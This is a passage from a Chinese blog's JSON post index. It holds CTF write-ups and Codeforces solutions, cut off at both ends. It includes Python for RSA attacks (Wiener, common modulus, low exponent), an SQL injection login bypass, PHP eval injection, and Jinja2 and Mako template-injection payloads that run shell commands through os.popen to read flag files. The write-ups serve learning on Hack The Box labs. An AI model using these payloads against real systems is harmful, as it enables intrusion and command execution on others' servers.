\\text{ mod }n) 计算$M = \\text{gcd}(r^k-1,n)$： 如果等于1，则继续； 如果不等于1，那么$p$一定是$M$的一个因数。这时只需要对$M$进行质因数分解。 代码实现： 1234567891011121314151617import mathdef pollard_p1(n, B=1000000): a = 2 for j in range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonen = result = pollard_p1(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;未成功&quot;) The Elliptic Curve Factorization Method详细可见： https://doc.sagemath.org/html/en/reference/interfaces/sage/interfaces/ecm.html 我们可以直接使用sage的ecm.factor()函数。 例子： 1234from sage.all import *n = factors = ecm.factor(n)phi = prod([f - 1 for f in factors]) 低指数攻击低加密指数攻击适用于加密所选的e非常小的情况，比如说 e=3,5 之类的。 这个时候很有可能 $m^e &lt; 10^5 \\cdot n$，所以可以直接遍历。 代码示例： 123456789101112131415161718from gmpy2 import irootfrom Crypto.Util.number import long_to_bytese = n = c = # 可以根据条件以及测试结果调整max的大小max = 10000for i in range(0, max): modified_c = c + i * n m_root, exact = iroot(modified_c, e) if exact: print(f&quot;找到解: i = &#123;i&#125;&quot;) print(&quot;明文:&quot;, long_to_bytes(m_root)) breakelse: print(&quot;尝试范围内未找到可解的 m&quot;) 低解密指数攻击这种攻击适用于d特别小的情况。（当给的e非常大的时候都可以试一下这种方法。） Wiener’s Attack这个是基于连分数（Continued Fraction）的一种算法。适用于 $d &lt; \\frac{n^{1/4}}{3}$ 的情况。 代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import mathfrom Crypto.Util.number import long_to_bytesdef continued_fraction(numerator, denominator): &quot;&quot;&quot;生成分数 numerator/denominator 的连分数表示&quot;&quot;&quot; cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): &quot;&quot;&quot;根据连分数序列 cf 生成收敛分数 (k, d)&quot;&quot;&quot; n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): &quot;&quot;&quot;判断 x 是否为完全平方数&quot;&quot;&quot; if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): &quot;&quot;&quot; 使用 Wiener 攻击尝试恢复 RSA 私钥 d。 参数: e: 公钥指数 n: 模数 返回: 若成功，返回私钥指数 d；否则返回 None。 &quot;&quot;&quot; cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue # 检查 (e*d - 1) 是否被 k 整除，以得到 phi if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k # 计算方程 x^2 - (n - phi + 1)x + n = 0 的判别式 s = n - phi + 1 discr = s * s - 4 * n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) # 计算 p, q p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return Nonen = e = c = d = wiener_attack(e, n)if d: print(f&quot;得到d: &#123;d&#125;&quot;) m = pow(c, d, n) message = long_to_bytes(m).decode() print(f&quot;明文内容为：&#123;message&#125;&quot;)else: print(&quot;Wiener 攻击未能恢复 d&quot;) 共模攻击适用情况：同一条明文消息被用相同的模数但不同的指数加密多次。 共模攻击成立必须满足以下几个条件： 使用 RSA 加密的两个密文： c_1 = m^{e_1} \\mod n,\\quad c_2 = m^{e_2} \\mod n 两个密文 $c_1$ 和 $c_1$ 是使用相同的模数 n，但使用了不同的指数 e₁ 和 e₂加密得到的。 $e_1$ 和 $e_2$ 需要满足互质：$\\text{gcd}(e₁, e₂) = 1$。 攻击方法：使用扩展欧几里得算法（Extended Euclidean Algorithm） 当满足上述条件时，我们可以用扩展欧几里得算法找到整数 x 和 y，使得： x \\cdot e_1 + y \\cdot e_2 = 1然后便可计算出明文： m = \\Bigl((c_1^x \\cdot c_2^y) \\mod n \\Bigl)因为： (c_1^x \\cdot c_2^y) \\equiv (m^{e_1})^x \\cdot (m^{e_2})^y \\equiv m^{x \\cdot e_1 + y \\cdot e_2} \\equiv m\\mod n注意： 如果 x 或 y 为负数，则需要使用逆元（modular inverse）处理负指数： $ c^{-a} \\mod n = (c^{-1})^a \\mod n $ 代码示例： 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import inverse, long_to_bytesfrom math import gcdn = e1 = e2 = c1 = c2 = # 使用扩展欧几里得算法求出 x 和 ydef extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return (x, y)x, y = extended_gcd(e1, e2)# 处理负指数（计算逆元）if x &lt; 0: c1 = inverse(c1, n) x = -xif y &lt; 0: c2 = inverse(c2, n) y = -ym = (pow(c1, x, n) * pow(c2, y, n)) % n# 解密后的明文print(long_to_bytes(m))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/en/tags/RSA/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/en/tags/sage/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/en/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/en/tags/CRT/"}]},{"title":"HTB Art Writeup","slug":"CTF/Misc/HTB-Art-Writeup","date":"2025-03-28T22:46:02.000Z","updated":"2025-04-02T21:33:27.623Z","comments":true,"path":"2025/03/28/CTF/Misc/HTB-Art-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/28/CTF/Misc/HTB-Art-Writeup/","excerpt":"","text":"题目描述 会拿到一张这样的图片： 题解这是Piet，一种esolang（esoteric programming language）。（详见https://en.wikipedia.org/wiki/Esoteric_programming_language#Piet） 这道题就是很典型的“知道就很简单，不知道就完全没法做”。 可以用这个网站在线运行： https://www.bertnase.de/npiet/npiet-execute.php 然后得到flag：HTB{p137_m0ndr14n}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Misc/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/en/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/en/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/en/tags/Piet/"}]},{"title":"HTB-sanitize Writeup","slug":"CTF/Web/HTB-sanitize-Writeup","date":"2025-03-28T19:12:23.000Z","updated":"2025-04-02T21:32:15.403Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-sanitize-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/28/CTF/Web/HTB-sanitize-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 随便输入个username和password会看到下方有一段SQL代码： 渗透猜测网页的登录逻辑是这样的：如果当前select成功（也就是说能在数据库里找到当前输入的账号信息），那么就可以登录成功。 所以直接SQL Injection，在username一栏输入 1admin&#x27; -- ，然后password那一栏输入任意内容（比如说1），就可以得到flag：HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/en/tags/SQL/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/en/tags/SQL-Injection/"}]},{"title":"HTB-LoveTok Writeup","slug":"CTF/Web/HTB-LoveTok-Writeup","date":"2025-03-28T10:30:49.000Z","updated":"2025-04-02T21:32:01.646Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 当点击了下面那个按钮之后网页的url会增加一个参数： 1/?format=r 因为给的附件比较多，所以直接挨个搜索“format”，可以确定下来2份相关代码： 12345678910&lt;?phpclass TimeController&#123; public function index($router) &#123; $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;r&#x27;; $time = new TimeModel($format); return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]); &#125;&#125; 这里会直接接收（没有过滤）我们传入的 format 的值，然后调用 TimeModel 处理这个值。 123456789101112131415161718&lt;?phpclass TimeModel&#123; public function __construct($format) &#123; $this-&gt;format = addslashes($format); # 把用户输入的 format 做了 addslashes() 处理，会把 &quot;, &#x27;, \\, NULL 这些内容前面加上反斜杠进行转义。 [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;; &#125; public function getTime() &#123; eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;); return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;; &#125;&#125; 注意，PHP 的 eval() 函数会把传入的字符串当作 PHP 代码来执行。所以这道题可以通过注入php代码（不能包含 %}，{% kbd ' %}，{% kbd %}，{% kbd NULL %}）来获取flag。 首先尝试 1/?format=$&#123;system(ls)&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/en/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/en/tags/PHP/"}]},{"title":"Codeforce Dragons","slug":"算法竞赛/Codeforce/1000/Codeforce-Dragons","date":"2025-03-28T10:15:13.000Z","updated":"2025-04-02T11:06:13.363Z","comments":true,"path":"2025/03/28/算法竞赛/Codeforce/1000/Codeforce-Dragons/","permalink":"https://archer-baiyi.github.io/en/2025/03/28/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Dragons/","excerpt":"","text":"题目描述 思路这道题的重点是可以自由挑选打龙的顺序，所以可以用vector来存储所有x，y的值，然后进行排序。 代码C++1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for sortusing namespace std;int main() { int s, n; cin &gt;&gt; s &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; dragons(n); // 每条龙是一个(x, y)的vector for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; dragons[i].first &gt;&gt; dragons[i].second; // first 是 x，second 是 y } // 按照龙的强度从小到大排序 // 默认先按照 pair 的 first 升序排列。如果 first 相等，再按照 second 升序排列 // begin和end会对所有内容进行排序。 sort(dragons.begin(), dragons.end()); for (int i = 0; i &lt; n; ++i) { if (s &gt; dragons[i].first) { s += dragons[i].second; // 赢了，加数值的奖励 } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"YES\" &lt;&lt; endl; return 0;} 如果是降序的话需要写成 123sort(dragons.begin(), dragons.end(), [](pair&lt;int, int&gt; a, pair&lt;int, int&gt; b) { return a.first &gt; b.first;});","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/en/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/en/tags/sortings/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"}]},{"title":"HTB Templated Writeup","slug":"CTF/Web/HTB-Templated-Writeup","date":"2025-03-27T20:02:53.000Z","updated":"2025-04-02T21:32:23.748Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Templated-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/27/CTF/Web/HTB-Templated-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站会发现一片空白： 专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为 1{{ code }} （以下用server来指代当前网址） 因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成 1server/{{7*7}} 时，会显示 可以看到 7*7 确实被执行了，所以确定这里就是注入口。 渗透有至少2种方法： 第一种通过模板中函数对象的 __globals__ 拿到全局作用域，然后借助 ____builtins__[__import__]__ 导入 os ，用 os.popen() 执行命令。 核心链路： 1234567891011self↓__init__ ← 模板函数对象↓__globals__ ← 函数的全局变量字典↓__builtins__['__import__'] ← 导入函数↓__import__('os') ← 导入 os 模块↓os.popen('命令').read() ← 执行命令并读取结果 按以下顺序注入： 1{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 或 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 确认了当前注入方式可行。 然后查找 flag 文件： 1{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} 最后直接读取flag： 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }} 第二种使用这个模板来发起命令执行（RCE）攻击： 1{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__['os'].popen('id').read() }} （需要找到popen对应的index） 首先用 1{{ [].__class__.__base__.__subclasses__() }} 列出所有 subclasses，然后通过 12345{% for c in [].__class__.__base__.__subclasses__() %} {% if 'Popen' in c.__name__ %} {{ loop.index0 }}: {{ c }} {% endif %}{% endfor %} 找到 popen 的index： 通过尝试 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }} 确认可以成功RCE。 接着就跟之前一样先找然后再读取flag： 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }} 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }} 拿到flag：HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/en/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/en/tags/Jinja2/"}]},{"title":"HTB Spookifier Writeup","slug":"CTF/Web/HTB-Spookifier-Writeup","date":"2025-03-27T17:16:33.000Z","updated":"2025-04-02T21:32:19.507Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","excerpt":"","text":"题目描述 （有附件） 解题观察打开网站： 输入 “abc“ 会看到： 然后我们来查看代码（routes.py）： 1234567891011121314from flask import Blueprint, requestfrom flask_mako import render_templatefrom application.util import spookifyweb = Blueprint('web', __name__)@web.route('/')def index(): text = request.args.get('text') if(text): converted = spookify(text) return render_template('index.html',output=converted) return render_template('index.html',output='') 可以看到网页会将我们的输入经过 sppokify() 函数转换一下再进行输出。 所以我们接着来查看 util.py ： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from mako.template import Templatefont1 = { 'A': '𝕬', 'B': '𝕭', 'C': '𝕮', ...}font2 = { 'A': 'ᗩ', 'B': 'ᗷ', 'C': 'ᑢ', ...}font3 = { 'A': '₳', 'B': '฿', 'C': '₵', ...} font4 = { 'A': 'A', 'B': 'B', 'C': 'C', ...}# 注意，这里的font4收录了所有的字母数字以及符号，并没有做任何修改。def generate_render(converted_fonts): result = ''' &lt;tr&gt; &lt;td&gt;{0}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{1}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{2}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{3}&lt;/td&gt; &lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render()def change_font(text_list): text_list = [*text_list] current_font = [] all_fonts = [] add_font_to_list = lambda text,font_type : ( [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear() ) and None add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') return all_fontsdef spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 可以看到定义了4种字体以及输出的页面格式。change_font() 和 spookify() 则负责转换字体。 假设我们输入了 ”input“，那么服务器按照以下流程来处理我们的输入： 接收我们的输入并赋值给 text： 1text = request.args.get('text') 调用 spookify(text)： 1converted = spookify(text) 123def spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 最后再利用 generate_render() 创建模板： 123456789def generate_render(converted_fonts): result = ''' &lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{3}&lt;/td&gt;&lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render() 注意，因为 font4 完全不会修改我们输入的内容，所以我们输入的所以内容（包括各种特殊符号）都会保留下来并被渲染进 {3} 的位置。 漏洞+渗透这道题主要考察的是 Template Injection（模板注入）： 模板注入是指攻击者将恶意代码注入到模板引擎中，使模板引擎在渲染时执行攻击者控制的表达式，造成信息泄露、RCE（远程代码执行）等后果。 漏洞主要由这几部分一起构成： 没有对输入内容进行过滤； font4会保留我们的所有输入内容 使用 Template(…).render() 动态渲染字符串模板 Mako里刚好有表达式语法： 1${} 所以导致我们输入 1${7*7} 时，mako会在渲染这部分内容 1234&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;${7*7}&lt;/td&gt;&lt;/tr&gt; 时，执行我们的代码，即 ${7*7}。所以最后的渲染结果是： 1&lt;tr&gt;&lt;td&gt;49&lt;/td&gt;&lt;/tr&gt; 这样子就我们说明注入成功了，接下来就是考虑如何读取flag了。 因为Mako 的底层代码会把 ${ } 表达式里的内容编译成 Python 代码，然后直接执行。所以我们直接注入python代码即可。 首先尝试 1${__import__('os').popen('ls').read()} 其中 1.popen('ls') 会执行 ls 命令（默认是当前工作目录），而 1.read() 会把命令输出读取成字符串。 可以看到 意味着当前目录下没有flag。我们接着查看上一级目录里的内容： 1${__import__('os').popen('ls ..').read()} 成功找到 flag.txt 文件。最后直接读取就好： 1${__import__('os').popen('cat ../flag.txt').read()} 得到flag：HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/en/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/en/tags/Mako/"}]},{"title":"Codeforce Chat room","slug":"算法竞赛/Codeforce/1000/Codeforce-Chat-room","date":"2025-03-27T12:13:26.000Z","updated":"2025-04-02T11:06:00.595Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Chat-room/","permalink":"https://archer-baiyi.github.io/en/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Chat-room/","excerpt":"","text":"题目描述 思路利用一个index/指针来逐个匹配目标字符串 “hello”。从j=0开始，如果找到了j就加一。如果最后j=5的话就说明找到了。 代码C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string s; cin &gt;&gt; s; string target = \"hello\"; int j = 0; for (char c : s) { if (c == target[j]) { j++; } if (j == target.size()) { break; } } if (j == target.size()) { cout &lt;&lt; \"YES\" &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"}]},{"title":"Codeforce Lucky Division","slug":"算法竞赛/Codeforce/1000/Codeforce-Lucky-Division","date":"2025-03-27T12:06:28.000Z","updated":"2025-04-02T11:06:22.990Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Lucky-Division/","permalink":"https://archer-baiyi.github.io/en/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Lucky-Division/","excerpt":"","text":"题目描述 思路写2个函数，第一个判断一个数是否是（严格的）lucky number，第二个函数遍历所有的lucky number判断是否是当前n的因数。 代码C++12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 判断一个数字是否是 lucky number（只含有 4 或 7）bool is_lucky(int num) { string s = to_string(num); // 比如说会把47转成\"47\" for (char c : s) { // 会遍历string中的每个字母 if (c != '4' &amp;&amp; c != '7') { return false; } } return true;}// 判断是否是 almost lucky numberstring is_almost_lucky(int n) { for (int i = 1; i &lt;= n; ++i) { if (is_lucky(i) &amp;&amp; n % i == 0) { return \"YES\"; } } return \"NO\";}int main() { int n; cin &gt;&gt; n; cout &lt;&lt; is_almost_lucky(n) &lt;&lt; endl; return 0;} Python12345678910111213def is_lucky(num): # 判断一个数字是不是 lucky number（只含 4 或 7） return all(c in '47' for c in str(num))def is_almost_lucky(n): # 枚举 1 到 n 的所有 lucky number for i in range(1, n + 1): if is_lucky(i) and n % i == 0: return \"YES\" return \"NO\"n = int(input())print(is_almost_lucky(n))","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"}]},{"title":"C++ 入门","slug":"编程/Cpp-入门","date":"2025-03-26T21:47:10.000Z","updated":"2025-11-12T10:03:03.205Z","comments":true,"path":"2025/03/26/编程/Cpp-入门/","permalink":"https://archer-baiyi.github.io/en/2025/03/26/%E7%BC%96%E7%A8%8B/Cpp-%E5%85%A5%E9%97%A8/","excerpt":"","text":"Hello World老规矩还是先见识一下输出“Hello World!”： 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;Hello World!&quot;; return 0;&#125; 注意几点： #include 这一部分和c是一样的，但是后面的库的名字是不同的； using namespace std; 是为了不需要后面每次使用像 cout 时得写全成 std::cout 。而且记得一定要在后面加上 ;； cout 是c output，想输出什么东西都得按照 cout","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/en/tags/C/"}]},{"title":"Codeforce-String Task","slug":"算法竞赛/Codeforce/1000/Codeforce-String-Task","date":"2025-03-26T13:02:00.000Z","updated":"2025-04-02T11:06:33.027Z","comments":true,"path":"2025/03/26/算法竞赛/Codeforce/1000/Codeforce-String-Task/","permalink":"https://archer-baiyi.github.io/en/2025/03/26/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-String-Task/","excerpt":"","text":"题目描述 思路代码Python1234567891011121314word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]# deletes all the vowelsword = ''.join(c for c in word if c.upper() not in V)# replaces all uppercase consonants with corresponding lowercase ones.word = word.lower()# inserts a character \".\" before each consonant,word = ''.join('.' + c for c in word)print(word) 优化： 12345word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]print(''.join('.' + c.lower() for c in word if c.upper() not in V)) C1 C++1","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"}]},{"title":"Codeforce Next 